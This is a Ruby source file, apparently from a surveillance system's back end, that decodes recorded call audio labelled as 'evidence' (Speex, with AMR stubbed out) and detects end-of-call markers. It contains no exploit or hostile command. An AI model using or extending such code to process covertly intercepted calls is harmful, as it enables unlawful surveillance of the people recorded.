module RCS

require_relative '../speex'
require_relative '../call_processor'
require_relative 'audio_evidence'

module CallProcessing
  extend AudioEvidence

  attr_reader :wav

  def end_call?
    self[:data][:grid_content].bytesize == 4 and self[:data][:grid_content] == "\xff\xff\xff\xff"
  end

  def process
    self[:wav] = []

    return if self[:data][:grid_content].nil?
    if end_call?
      trace :debug, "[CallProcessing] FINE CHIAMATA #{self[:data][:peer]}!!!"
      return
    end

    codec = :amr if self[:data][:sample_rate] & LOG_AUDIO_AMR == 1
    codec ||= :speex
    self[:data][:sample_rate] &= ~LOG_AUDIO_AMR # clear codec bit if set

    # speex decode
    case self[:data][:program]
      when "Mobile"
        self[:wav] = Speex.get_wav_frames(self[:data][:grid_content], Speex::MODEID_NB) if codec == :speex
        self[:wav] = [] if codec == :amr # AMR.get_wav_frames data if codec == :amr
      else
        self[:wav] = Speex.get_wav_frames(self[:data][:grid_content], Speex::MODEID_UWB) if codec == :speex
        self[:wav] = [] if codec == :amr  #self[:wav] = AMR.get_wav_frames data if codec == :amr
    end
    #wav = Wave.new 1, self[:data][:sample_rate]
    #wav.write "#{self[:data][:peer]}_#{self[:data][:start_time].to_f}_#{self[:data][:channel]}.wav", self[:wav]
  end
  
  def type
    :call
  end
  
end

end # RCS::
